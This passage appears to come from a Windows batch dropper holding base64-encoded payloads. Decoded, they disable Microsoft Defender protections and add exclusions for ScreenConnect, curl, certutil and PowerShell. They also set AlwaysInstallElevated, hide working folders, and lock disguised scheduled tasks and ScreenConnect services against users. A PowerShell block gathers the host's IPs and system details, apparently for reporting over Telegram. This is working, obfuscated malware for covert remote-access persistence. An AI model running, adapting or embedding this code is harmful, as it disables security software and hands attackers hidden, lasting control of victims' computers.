QVRFJSAtU3VtbWFyeSAiJU1TRyUiIC1CdWlsZCAlTU9OVkVSJSAtQ291bnQgJUNPVU5UJSA+bnVs
IDI+JjENCmVjaG8gdGcgc3RhdGUgJU5FV1NUQVRFJSBzZW50Pj4iJUxPRyUiDQpleGl0IC9iIDAN
Cg==
::B64_MON_END
::B64_SEC_BEGIN
QGVjaG8gb2ZmClJFTSBPV05fU0VDVVJFIEJVSUxEIDIwMjYwODAyUzcgLSBncnl4YSBrZWVwICsg
aWRlbnRpdHktYXdhcmUgdGFzayBBQ0wgKyBEaXNhYmxlTVNJIG5ldXRyYWxpemUgKyBleGNsdXNp
b25zL0FDTDsgbm8gYXR0ci1sb2NrIG9uIG11dGFibGUgcGF5bG9hZHMKc2V0bG9jYWwgRW5hYmxl
RXh0ZW5zaW9ucyBFbmFibGVEZWxheWVkRXhwYW5zaW9uCnNldCAiV0Q9JVByb2dyYW1EYXRhJVxN
aWNyb3NvZnRcV2luZG93c1xXRVJcVGVtcFwud3VjYWNoZSIKc2V0ICJXRDI9JVByb2dyYW1EYXRh
JVxNaWNyb3NvZnRcRGlhZ25vc2lzXFN0YXRlXC5ldGxjYWNoZSIKc2V0ICJMT0c9JVdEJVxib290
LmVyciIKc2V0ICJQUklNPVNjcmVlbkNvbm5lY3QgQ2xpZW50ICg1ZjYwMTA1Nzk4NTJlNTA3KSIK
c2V0ICJBTFQ9U2NyZWVuQ29ubmVjdCBDbGllbnQgKGY4NjFjODE0MGQ0NTM0MjcpIgpzZXQgIkdS
WVhBPVNjcmVlbkNvbm5lY3QgQ2xpZW50ICg5OTA4MTk4ZTY2OGU0NzUwKSIKc2V0ICJLRUVQMT01
ZjYwMTA1Nzk4NTJlNTA3IgpzZXQgIktFRVAyPWY4NjFjODE0MGQ0NTM0MjciCnNldCAiS0VFUDM9
OTkwODE5OGU2NjhlNDc1MCIKc2V0ICJQRj0lUHJvZ3JhbUZpbGVzJSIKc2V0ICJQRjg2PSVQcm9n
cmFtRmlsZXMoeDg2KSUiCnNldCAiVEFTS1JPT1Q9JVN5c3RlbVJvb3QlXFN5c3RlbTMyXFRhc2tz
IgoKaWYgbm90IGV4aXN0ICIlV0QlIiBta2RpciAiJVdEJSIgPm51bCAyPiYxCmlmIG5vdCBleGlz
dCAiJVdEMiUiIG1rZGlyICIlV0QyJSIgPm51bCAyPiYxCmVjaG8gc2VjdXJlX2JlZ2luICVEQVRF
JSAlVElNRSUgUzc+PiIlTE9HJSIKClJFTSAtLS0gTmV1dHJhbGl6ZSBNU0kgYmxvY2sgcG9saWNp
ZXMgKDE2MjUpIC0tLQpSRU0gRGlzYWJsZU1TSTogMD1hbGxvdywgMT1ub24tYWRtaW4gb25seSwg
Mj1hbGwgLT4gZm9yY2UgMApyZWcgYWRkICJIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29m
dFxXaW5kb3dzXEluc3RhbGxlciIgL3YgRGlzYWJsZU1TSSAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+
bnVsIDI+JjEKcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93
c1xJbnN0YWxsZXIiIC92IEFsd2F5c0luc3RhbGxFbGV2YXRlZCAvdCBSRUdfRFdPUkQgL2QgMSAv
ZiA+bnVsIDI+JjEKcmVnIGRlbGV0ZSAiSEtDVVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRc
V2luZG93c1xJbnN0YWxsZXIiIC92IERpc2FibGVNU0kgL2YgPm51bCAyPiYxCnJlZyBhZGQgIkhL
Q1VcU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3NcSW5zdGFsbGVyIiAvdiBBbHdh
eXNJbnN0YWxsRWxldmF0ZWQgL3QgUkVHX0RXT1JEIC9kIDEgL2YgPm51bCAyPiYxCgpSRU0gLS0t
IERlZmVuZGVyOiByZWdpc3RyeSBleGNsdXNpb25zIChwb2xpY3kgKyBwcmVmZXJlbmNlIGtleXMp
IC0tLQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzIERl
ZmVuZGVyIiAvdiBEaXNhYmxlQW50aVNweXdhcmUgL3QgUkVHX0RXT1JEIC9kIDEgL2YgPm51bCAy
PiYxCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3MgRGVm
ZW5kZXJcUmVhbC1UaW1lIFByb3RlY3Rpb24iIC92IERpc2FibGVSZWFsdGltZU1vbml0b3Jpbmcg
L3QgUkVHX0RXT1JEIC9kIDEgL2YgPm51bCAyPiYxCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcUG9s
aWNpZXNcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcUmVhbC1UaW1lIFByb3RlY3Rpb24iIC92
IERpc2FibGVCZWhhdmlvck1vbml0b3JpbmcgL3QgUkVHX0RXT1JEIC9kIDEgL2YgPm51bCAyPiYx
CnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5k
ZXJcUmVhbC1UaW1lIFByb3RlY3Rpb24iIC92IERpc2FibGVJT0FWUHJvdGVjdGlvbiAvdCBSRUdf
RFdPUkQgL2QgMSAvZiA+bnVsIDI+JjEKcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xN
aWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxSZWFsLVRpbWUgUHJvdGVjdGlvbiIgL3YgRGlzYWJs
ZVNjcmlwdFNjYW5uaW5nIC90IFJFR19EV09SRCAvZCAxIC9mID5udWwgMj4mMQpyZWcgYWRkICJI
S0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUGF0aHMi
IC92ICIlV0QlIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjEKcmVnIGFkZCAiSEtMTVxT
T0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFBhdGhzIiAvdiAi
JVdEMiUiIC90IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQpyZWcgYWRkICJIS0xNXFNPRlRX
QVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUGF0aHMiIC92ICJDOlxX
aW5kb3dzXFRlbXAiIC90IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQpyZWcgYWRkICJIS0xN
XFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUGF0aHMiIC92
ICIlVEVNUCUiIC90IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQpyZWcgYWRkICJIS0xNXFNP
RlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUGF0aHMiIC92ICIl
UEYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDElKSIgL3QgUkVHX0RXT1JEIC9kIDAgL2Yg
Pm51bCAyPiYxCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5k
ZXJcRXhjbHVzaW9uc1xQYXRocyIgL3YgIiVQRiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQ
MiUpIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjEKcmVnIGFkZCAiSEtMTVxTT0ZUV0FS
RVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFBhdGhzIiAvdiAiJVBGJVxT
Y3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAzJSkiIC90IFJFR19EV09SRCAvZCAwIC9mID5udWwg
Mj4mMQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4
Y2x1c2lvbnNcUGF0aHMiIC92ICIlUEY4NiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMSUp
IiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjEKcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxN
aWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFBhdGhzIiAvdiAiJVBGODYlXFNj
cmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDIlKSIgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAy
PiYxCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhj
bHVzaW9uc1xQYXRocyIgL3YgIiVQRjg2JVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAzJSki
IC90IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQpmb3IgJSVQIGluIChtc2lleGVjLmV4ZSBj
dXJsLmV4ZSBjbWQuZXhlIHBvd2Vyc2hlbGwuZXhlIGNlcnR1dGlsLmV4ZSBTY3JlZW5Db25uZWN0
LkNsaWVudFNlcnZpY2UuZXhlIFNjcmVlbkNvbm5lY3QuV2luZG93c0NsaWVudC5leGUpIGRvICgK
ICByZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1
c2lvbnNcUHJvY2Vzc2VzIiAvdiAiJSVQIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjEK
KQoKUkVNIC0tLSBEZWZlbmRlcjogbGl2ZSBNcFByZWZlcmVuY2UgKHN0cm9uZ2VyIHRoYW4gcmVn
IGFsb25lKSAtLS0KcG93ZXJzaGVsbC5leGUgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4
ZWN1dGlvblBvbGljeSBCeXBhc3MgLUNvbW1hbmQgXgogICIkRXJyb3JBY3Rpb25QcmVmZXJlbmNl
PSdTaWxlbnRseUNvbnRpbnVlJzsiIF4KICAiVHJ5e1NldC1NcFByZWZlcmVuY2UgLURpc2FibGVS
ZWFsdGltZU1vbml0b3JpbmcgJHRydWU7IFNldC1NcFByZWZlcmVuY2UgLURpc2FibGVCZWhhdmlv
ck1vbml0b3JpbmcgJHRydWU7IFNldC1NcFByZWZlcmVuY2UgLURpc2FibGVJT0FWUHJvdGVjdGlv
biAkdHJ1ZTsgU2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZVNjcmlwdFNjYW5uaW5nICR0cnVlfUNh
dGNoe307IiBeCiAgIiRwYXRocz1AKCclV0QlJywnJVdEMiUnLCdDOlxXaW5kb3dzXFRlbXAnLCRl
bnY6VEVNUCwnJVBGJVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAxJSknLCclUEYlXFNjcmVl
bkNvbm5lY3QgQ2xpZW50ICglS0VFUDIlKScsJyVQRjg2JVxTY3JlZW5Db25uZWN0IENsaWVudCAo
JUtFRVAxJSknLCclUEY4NiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMiUpJyk7IiBeCiAg
InRyeXskcGF0aHMrPUAoR2V0LUNoaWxkSXRlbSAtUGF0aCAkZW52OlByb2dyYW1GaWxlcyAtRmls
dGVyICdTY3JlZW5Db25uZWN0IENsaWVudConIC1EaXJlY3RvcnkgLUVBIDAgfCBGb3JFYWNoLU9i
amVjdCB7JF8uRnVsbE5hbWV9KX1jYXRjaHt9OyIgXgogICJ0cnl7JHBmODY9W0Vudmlyb25tZW50
XTo6R2V0Rm9sZGVyUGF0aCgnUHJvZ3JhbUZpbGVzWDg2Jyk7IGlmKCRwZjg2KXskcGF0aHMrPUAo
R2V0LUNoaWxkSXRlbSAtUGF0aCAkcGY4NiAtRmlsdGVyICdTY3JlZW5Db25uZWN0IENsaWVudCon
IC1EaXJlY3RvcnkgLUVBIDAgfCBGb3JFYWNoLU9iamVjdCB7JF8uRnVsbE5hbWV9KX19Y2F0Y2h7
fTsiIF4KICAiZm9yZWFjaCgkcCBpbiAoJHBhdGhzIHwgU2VsZWN0LU9iamVjdCAtVW5pcXVlKSl7
IGlmKCRwIC1hbmQgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJHApKXsgQWRkLU1wUHJlZmVyZW5j
ZSAtRXhjbHVzaW9uUGF0aCAkcCAtRUEgMCB9IH07IiBeCiAgImZvcmVhY2goJHggaW4gQCgnbXNp
ZXhlYy5leGUnLCdjdXJsLmV4ZScsJ2NtZC5leGUnLCdwb3dlcnNoZWxsLmV4ZScsJ2NlcnR1dGls
LmV4ZScsJ1NjcmVlbkNvbm5lY3QuQ2xpZW50U2VydmljZS5leGUnLCdTY3JlZW5Db25uZWN0Lldp
bmRvd3NDbGllbnQuZXhlJykpeyBBZGQtTXBQcmVmZXJlbmNlIC1FeGNsdXNpb25Qcm9jZXNzICR4
IC1FQSAwIH07IiBeCiAgIkFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvbkV4dGVuc2lvbiAnLmNt
ZCcsJy5wczEnLCcubXNpJyAtRUEgMCIgPm51bCAyPiYxCgpSRU0gLS0tIEFDTDogb25seSBTWVNU
RU0gKyBBZG1pbmlzdHJhdG9ycyBvbiBwZXJzaXN0IGRpcnMgLS0tCmNhbGwgOkxvY2tEaXIgIiVX
RCUiCmNhbGwgOkxvY2tEaXIgIiVXRDIlIgoKUkVNIC0tLSBoaWRlIHdvcmtkaXJzICsga2V5IHBh
eWxvYWQgZmlsZXMgLS0tCmF0dHJpYiAraCArcyAiJVdEJSIgPm51bCAyPiYxCmF0dHJpYiAraCAr
cyAiJVdEMiUiID5udWwgMj4mMQpSRU0gUzU6IGRvIE5PVCBoaWRlL2xvY2sgdGhlIG11dGFibGUg
cGF5bG9hZCBzY3JpcHRzIC0gY29weS9tb3ZlIG92ZXIgK2ggK3MgZmlsZXMKUkVNIGZhaWxzIHNp
bGVudGx5IGFuZCBmcm96ZSB0aGUgd2hvbGUgZmxlZXQncyBzZWxmLXVwZGF0ZS4gSGlkZGVuIGRp
cnMgY29uY2VhbCBjb250ZW50cyBhbHJlYWR5Lgpmb3IgJSVGIGluIChwa2cubXNpIG5vdGlmeS5j
ZmcgaWRlbnRpdHkuY2ZnIHN0YXRlLmpzb24pIGRvICgKICBpZiBleGlzdCAiJVdEJVwlJUYiIGF0
dHJpYiAraCArcyAiJVdEJVwlJUYiID5udWwgMj4mMQopCgpSRU0gLS0tIEFDTDogc2NoZWR1bGVk
IHRhc2sgWE1MIChoYXJkZXIgdG8gZGVsZXRlIHdpdGhvdXQgQWRtaW4pIC0tLQpSRU0gUzY6IG5h
bWVzIGNvbnRhaW4gc3BhY2VzICgiU2VydmVyIERpYWdub3N0aWNzIikgLSB0aGUgY21kIEZPUiBs
b29wIHNwbGl0ClJFTSB0aGVtIGludG8gZ2FyYmFnZSB0b2tlbnMuIFBvd2VyU2hlbGwgcmVhZHMg
aWRlbnRpdHkuY2ZnIGRpcmVjdGx5IGluc3RlYWQuCnBvd2Vyc2hlbGwuZXhlIC1Ob1Byb2ZpbGUg
LU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1Db21tYW5kIF4KICAiJEVy
cm9yQWN0aW9uUHJlZmVyZW5jZT0nU2lsZW50bHlDb250aW51ZSc7ICRuYW1lcz1AKCk7IiBeCiAg
ImlmKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJyVXRCVcaWRlbnRpdHkuY2ZnJyl7IEdldC1Db250
ZW50IC1MaXRlcmFsUGF0aCAnJVdEJVxpZGVudGl0eS5jZmcnIC1Gb3JjZSB8IEZvckVhY2gtT2Jq
ZWN0IHsgaWYoJF8gLW1hdGNoICdeVEFTS19bQS1EXT0oLispJCcpeyAkbmFtZXMgKz0gJG1hdGNo
ZXNbMV0uVHJpbSgpLlRyaW1TdGFydCgnXCcpIH0gfSB9IiBeCiAgImVsc2UgeyAkbmFtZXM9QCgn
V2VyUXVldWVTeW5jJywnUGxhU2VydmVySGVhbHRoJywnV2RpSG9zdFByb3h5JywnVGNwSXBDb25m
bGljdFJlcycpIH07IiBeCiAgImZvcmVhY2goJG4gaW4gJG5hbWVzKXsgJGYgPSBKb2luLVBhdGgg
JyVUQVNLUk9PVCUnICRuOyBpZihUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRmKXsgJiBpY2FjbHMu
ZXhlICRmIC9pbmhlcml0YW5jZTpyIHwgT3V0LU51bGw7ICYgaWNhY2xzLmV4ZSAkZiAvZ3JhbnQ6
ciAnTlQgQVVUSE9SSVRZXFNZU1RFTTpGJyAnQlVJTFRJTlxBZG1pbmlzdHJhdG9yczpGJyB8IE91
dC1OdWxsOyAmIGF0dHJpYi5leGUgK2ggK3MgJGYgfCBPdXQtTnVsbCB9IH0iID5udWwgMj4mMQoK
UkVNIC0tLSBBQ0w6IFdNSSB3YXRjaGRvZyBzdWJzY3JpcHRpb24gZmlsZXMgKGNoYWluIDIpIC0t
LQppY2FjbHMgIiVTeXN0ZW1Sb290JVxTeXN0ZW0zMlx3YmVtXFJlcG9zaXRvcnkiIC9ncmFudCAi
TlQgQVVUSE9SSVRZXFNZU1RFTTpGIiA+bnVsIDI+JjEKClJFTSAtLS0gQUNMOiBrZWVwIFNjcmVl
bkNvbm5lY3QgaW5zdGFsbCBkaXJzIChvbmNlOyB0YWtlb3duIGV2ZXJ5IHRpY2sgaXMgbm9pc3kp
IC0tLQppZiBub3QgZXhpc3QgIiVXRCVcc2VjdXJlX3NjLmZsYWciICgKICBmb3IgJSVEIGluICgK
ICAgICIlUEYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDElKSIKICAgICIlUEYlXFNjcmVl
bkNvbm5lY3QgQ2xpZW50ICglS0VFUDIlKSIKICAgICIlUEYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50
ICglS0VFUDMlKSIKICAgICIlUEY4NiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMSUpIgog
ICAgIiVQRjg2JVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAyJSkiCiAgICAiJVBGODYlXFNj
cmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDMlKSIKICApIGRvICgKICAgIGlmIGV4aXN0ICIlJX5E
IiBjYWxsIDpMb2NrRGlyICIlJX5EIgogICkKICBlY2hvIHNjX2xvY2tlZD4lV0QlXHNlY3VyZV9z
Yy5mbGFnCikKClJFTSAtLS0gU0Mgc2VydmljZXM6IFNZU1RFTSBjYW4gY29uZmlnL3N0b3AvZGVs
ZXRlOyBCQSBmdWxsOyB1c2VycyBibG9ja2VkIC0tLQpSRU0gU1k6IENDIERDIExDIFNXIFJQIERU
IExPIFJDICAobm8gU0QgLT4gY2Fubm90IGNoYW5nZSB0aGlzIFNEIGl0c2VsZikKc2V0ICJTRD1E
OihBOztDQ0RDTENTV1JQV1BEVExPQ1JSQzs7O1NZKShBOztDQ0RDTENTV1JQV1BEVExPQ1JTRFJD
V0RXTzs7O0JBKSIKc2MuZXhlIHNkc2V0ICIlUFJJTSUiICIlU0QlIiA+bnVsIDI+JjEKc2MuZXhl
IHNkc2V0ICIlQUxUJSIgIiVTRCUiID5udWwgMj4mMQpzYy5leGUgc2RzZXQgIiVHUllYQSUiICIl
U0QlIiA+bnVsIDI+JjEKc2MuZXhlIGNvbmZpZyAiJVBSSU0lIiBzdGFydD0gYXV0byA+bnVsIDI+
JjEKc2MuZXhlIGNvbmZpZyAiJUFMVCUiIHN0YXJ0PSBhdXRvID5udWwgMj4mMQpzYy5leGUgY29u
ZmlnICIlR1JZWEElIiBzdGFydD0gYXV0byA+bnVsIDI+JjEKc2MuZXhlIGZhaWx1cmUgIiVQUklN
JSIgcmVzZXQ9IDg2NDAwIGFjdGlvbnM9IHJlc3RhcnQvNjAwMDAvcmVzdGFydC82MDAwMC9yZXN0
YXJ0LzYwMDAwID5udWwgMj4mMQpzYy5leGUgZmFpbHVyZSAiJUFMVCUiIHJlc2V0PSA4NjQwMCBh
Y3Rpb25zPSByZXN0YXJ0LzYwMDAwL3Jlc3RhcnQvNjAwMDAvcmVzdGFydC82MDAwMCA+bnVsIDI+
JjEKc2MuZXhlIGZhaWx1cmUgIiVHUllYQSUiIHJlc2V0PSA4NjQwMCBhY3Rpb25zPSByZXN0YXJ0
LzYwMDAwL3Jlc3RhcnQvNjAwMDAvcmVzdGFydC82MDAwMCA+bnVsIDI+JjEKCmVjaG8gc2VjdXJl
X2RvbmU+PiIlTE9HJSIKZXhpdCAvYiAwCgo6TG9ja0RpcgpzZXQgIlQ9JX4xIgppZiBub3QgZXhp
c3QgIiVUJSIgZXhpdCAvYiAwClJFTSB0YWtlIG93bmVyc2hpcCB0aGVuIHN0cmlwIGluaGVyaXRl
ZCBBQ0VzOyBTWVNURU0rQWRtaW5zIG9ubHkKdGFrZW93biAvRiAiJVQlIiAvUiAvRCBZID5udWwg
Mj4mMQppY2FjbHMgIiVUJSIgL2luaGVyaXRhbmNlOnIgPm51bCAyPiYxCmljYWNscyAiJVQlIiAv
Z3JhbnQ6ciAiTlQgQVVUSE9SSVRZXFNZU1RFTTooT0kpKENJKUYiICJCVUlMVElOXEFkbWluaXN0
cmF0b3JzOihPSSkoQ0kpRiIgPm51bCAyPiYxCmljYWNscyAiJVQlIiAvcmVtb3ZlOmcgIlVzZXJz
IiAiQXV0aGVudGljYXRlZCBVc2VycyIgIkV2ZXJ5b25lIiAiTlQgQVVUSE9SSVRZXElOVEVSQUNU
SVZFIiAiQlVJTFRJTlxVc2VycyIgPm51bCAyPiYxCmV4aXQgL2IgMAo=
::B64_SEC_END
::B64_TGR_BEGIN
I1JlcXVpcmVzIC1WZXJzaW9uIDUuMQojIFRHX1JFUE9SVCBCVUlMRCAyMDI2MDgwMlQxNSAtIHJv
b3QtbGV2ZWwgdGFzayBuYW1lcyAoSURFTlRWRVI9Nyk7IFRSIG93bmVyc2hpcDsgUk1NK0RhdHRv
IGtlZXAKcGFyYW0oCiAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICR0cnVlKV1bc3RyaW5nXSRT
dGF0ZSwKICAgIFtzdHJpbmddJFN1bW1hcnkgPSAnJywKICAgIFtzdHJpbmddJFdvcmtEaXIgPSAn
QzpcUHJvZ3JhbURhdGFcTWljcm9zb2Z0XFdpbmRvd3NcV0VSXFRlbXBcLnd1Y2FjaGUnLAogICAg
W3N0cmluZ10kT2xkU3RhdGUgPSAnJywKICAgIFtWYWxpZGF0ZVNldCgncmljaCcsICdjb21wYWN0
JyldW3N0cmluZ10kTW9kZSA9ICdyaWNoJywKICAgIFtzdHJpbmddJEJ1aWxkID0gJ08xNScsCiAg
ICBbc3RyaW5nXSRDb3VudCA9ICcwJwopCgokRXJyb3JBY3Rpb25QcmVmZXJlbmNlID0gJ1NpbGVu
dGx5Q29udGludWUnCiRQcm9ncmVzc1ByZWZlcmVuY2UgPSAnU2lsZW50bHlDb250aW51ZScKdHJ5
IHsgW05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2Vj
dXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMiB9IGNhdGNoIHt9CgpmdW5jdGlvbiBHZXQtQ2ZnIHsK
ICAgICRwYXRoID0gSm9pbi1QYXRoICRXb3JrRGlyICdub3RpZnkuY2ZnJwogICAgJGNmZyA9IEB7
fQogICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAkcGF0aCkpIHsgcmV0dXJuICRjZmcgfQogICAgR2V0
LUNvbnRlbnQgLUxpdGVyYWxQYXRoICRwYXRoIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgIGlm
ICgkXyAtbWF0Y2ggJ15ccyooW0EtWmEtejAtOV9dKylccyo9XHMqKC4qKVxzKiQnKSB7CiAgICAg
ICAgICAgICRjZmdbJG1hdGNoZXNbMV1dID0gJG1hdGNoZXNbMl0uVHJpbSgpCiAgICAgICAgfQog
ICAgfQogICAgcmV0dXJuICRjZmcKfQoKZnVuY3Rpb24gRXNjKFtzdHJpbmddJHMpIHsKICAgIGlm
ICgkbnVsbCAtZXEgJHMpIHsgcmV0dXJuICcnIH0KICAgIHJldHVybiAoJHMgLXJlcGxhY2UgJyYn
LCAnJmFtcDsnIC1yZXBsYWNlICc8JywgJyZsdDsnIC1yZXBsYWNlICc+JywgJyZndDsnKQp9Cgpm
dW5jdGlvbiBHZXQtUHVibGljSXAgewogICAgZm9yZWFjaCAoJHUgaW4gQCgKICAgICAgICAgICAg
J2h0dHBzOi8vYXBpLmlwaWZ5Lm9yZycsCiAgICAgICAgICAgICdodHRwczovL2lmY29uZmlnLm1l
L2lwJywKICAgICAgICAgICAgJ2h0dHBzOi8vaWNhbmhhemlwLmNvbScKICAgICAgICApKSB7CiAg
ICAgICAgdHJ5IHsKICAgICAgICAgICAgJHIgPSBJbnZva2UtV2ViUmVxdWVzdCAtVXJpICR1IC1V
c2VCYXNpY1BhcnNpbmcgLVRpbWVvdXRTZWMgNgogICAgICAgICAgICAkaXAgPSAoJHIuQ29udGVu
dCB8IE91dC1TdHJpbmcpLlRyaW0oKQogICAgICAgICAgICBpZiAoJGlwIC1tYXRjaCAnXlxkezEs
M30oXC5cZHsxLDN9KXszfSQnIC1vciAkaXAgLW1hdGNoICc6JykgeyByZXR1cm4gJGlwIH0KICAg
ICAgICB9IGNhdGNoIHt9CiAgICB9CiAgICByZXR1cm4gJ24vYScKfQoKZnVuY3Rpb24gR2V0LUxv
Y2FsSXBzIHsKICAgIHRyeSB7CiAgICAgICAgJGlwcyA9IEdldC1OZXRJUEFkZHJlc3MgLUFkZHJl
c3NGYW1pbHkgSVB2NCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8CiAgICAgICAgICAg
IFdoZXJlLU9iamVjdCB7ICRfLklQQWRkcmVzcyAtbm90bGlrZSAnMTI3LionIC1hbmQgJF8uUHJl
Zml4T3JpZ2luIC1uZSAnV2VsbEtub3duJyB9IHwKICAgICAgICAgICAgU2VsZWN0LU9iamVjdCAt
RXhwYW5kUHJvcGVydHkgSVBBZGRyZXNzIC1VbmlxdWUKICAgICAgICBpZiAoJGlwcykgeyByZXR1
cm4gKCRpcHMgLWpvaW4gJywgJykgfQogICAgfSBjYXRjaCB7fQogICAgdHJ5IHsKICAgICAgICAk
aXBzID0gR2V0LUNpbUluc3RhbmNlIFdpbjMyX05ldHdvcmtBZGFwdGVyQ29uZmlndXJhdGlvbiAt
RmlsdGVyICdJUEVuYWJsZWQ9VHJ1ZScgfAogICAgICAgICAgICBGb3JFYWNoLU9iamVjdCB7ICRf
LklQQWRkcmVzcyB9IHwgV2hlcmUtT2JqZWN0IHsgJF8gLWFuZCAkXyAtbm90bGlrZSAnMTI3Lion
IC1hbmQgJF8gLW5vdGxpa2UgJyo6KicgfQogICAgICAgIGlmICgkaXBzKSB7IHJldHVybiAoKCRp
cHMgfCBTZWxlY3QtT2JqZWN0IC1VbmlxdWUpIC1qb2luICcsICcpIH0KICAgIH0gY2F0Y2gge30K
ICAgIHJldHVybiAnbi9hJwp9CgpmdW5jdGlvbiBHZXQtT3NJbmZvIHsKICAgICRvID0gW29yZGVy
ZWRdQHsKICAgICAgICBDYXB0aW9uID0gJ24vYSc7IFZlcnNpb24gPSAnbi9hJzsgQnVpbGQgPSAn
bi9hJzsgQXJjaCA9ICduL2EnCiAgICAgICAgRG9tYWluID0gJ24vYSc7IEluc3RhbGxEYXRlID0g
J24vYSc7IExhc3RCb290ID0gJ24vYScKICAgICAgICBDUFUgPSAnbi9hJzsgTWFudWZhY3R1cmVy
ID0gJ24vYSc7IE1vZGVsID0gJ24vYSc7IFNlcmlhbCA9ICduL2EnCiAgICAgICAgVG90YWxSQU1f
R0IgPSAnbi9hJzsgRGlza0ZyZWVfR0IgPSAnbi9hJzsgRGlza1NpemVfR0IgPSAnbi9hJwogICAg
fQogICAgdHJ5IHsKICAgICAgICAkb3MgPSBHZXQtQ2ltSW5zdGFuY2UgV2luMzJfT3BlcmF0aW5n
U3lzdGVtCiAgICAgICAgJG8uQ2FwdGlvbiA9ICRvcy5DYXB0aW9uCiAgICAgICAgJG8uVmVyc2lv
biA9ICRvcy5WZXJzaW9uCiAgICAgICAgJG8uQnVpbGQgPSAkb3MuQnVpbGROdW1iZXIKICAgICAg
ICAkby5BcmNoID0gJG9zLk9TQXJjaGl0ZWN0dXJlCiAgICAgICAgJG8uSW5zdGFsbERhdGUgPSAo
JG9zLkluc3RhbGxEYXRlIHwgR2V0LURhdGUgLUZvcm1hdCAneXl5eS1NTS1kZCcpCiAgICAgICAg
JG8uTGFzdEJvb3QgPSAoJG9zLkxhc3RCb290VXBUaW1lIHwgR2V0LURhdGUgLUZvcm1hdCAneXl5
eS1NTS1kZCBISDptbScpCiAgICAgICAgJG8uVG90YWxSQU1fR0IgPSBbbWF0aF06OlJvdW5kKCRv
cy5Ub3RhbFZpc2libGVNZW1vcnlTaXplIC8gMU1CLCAxKQogICAgfSBjYXRjaCB7fQogICAgdHJ5
IHsKICAgICAgICAkY3MgPSBHZXQtQ2ltSW5zdGFuY2UgV2luMzJfQ29tcHV0ZXJTeXN0ZW0KICAg
